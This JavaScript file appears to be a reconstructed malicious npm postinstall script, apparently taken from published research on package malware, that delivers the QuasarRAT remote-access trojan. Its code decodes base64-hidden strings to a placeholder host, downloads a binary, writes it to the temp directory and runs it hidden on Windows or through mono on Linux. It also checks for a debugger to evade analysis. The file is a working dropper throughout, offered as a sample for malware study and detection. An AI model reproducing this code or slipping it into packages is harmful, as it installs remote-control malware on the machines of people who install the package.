// quasar-rat-delivery — reconstructed from public security analyses
// Source: https://github.com/nicolo-ribaudo/malicious-packages-research (ossf/malicious-packages MAL-2024-7769)
//
// Multi-stage QuasarRAT delivery. Heavily obfuscated postinstall.js
// with multiple deobfuscation stages before downloading and executing
// .NET RAT binary.
//
// Technique: Multi-stage obfuscation + remote binary download + .NET RAT execution

const https = require("https");
const fs = require("fs");
const path = require("path");
const os = require("os");
const { exec, execSync } = require("child_process");

// Stage 1: Deobfuscation via array rotation + string decoding
var _0x = ["aHR0cHM6Ly9yYXQuZXhhbXBsZS5jb20vc3RhZ2Uy", "dG1w", "cXVhc2FyLmV4ZQ=="];
function decode(idx) {
  return Buffer.from(_0x[idx], "base64").toString();
}

// Stage 2: Download RAT binary
function downloadPayload(callback) {
  var url = decode(0); // https://rat.example.com/stage2
  https.get(url, function(res) {
    var chunks = [];
    res.on("data", function(chunk) { chunks.push(chunk); });
    res.on("end", function() {
      var buffer = Buffer.concat(chunks);
      callback(null, buffer);
    });
  }).on("error", function(err) {
    callback(err);
  });
}

// Stage 3: Write and execute
function deployRAT(buffer) {
  var tmpDir = os.tmpdir();
  var ratPath = path.join(tmpDir, decode(2)); // quasar.exe

  try {
    fs.writeFileSync(ratPath, buffer);

    if (os.platform() === "win32") {
      // Windows: execute directly
      exec(ratPath, { detached: true, windowsHide: true });
    } else {
      // Linux: try mono for .NET execution
      execSync("chmod +x " + ratPath);
      exec("mono " + ratPath + " || ./" + ratPath, { detached: true });
    }
  } catch(e) {}
}

// Anti-analysis: check for debugger
if (typeof v8debug === "undefined") {
  downloadPayload(function(err, data) {
    if (!err && data && data.length > 1000) {
      deployRAT(data);
    }
  });
}
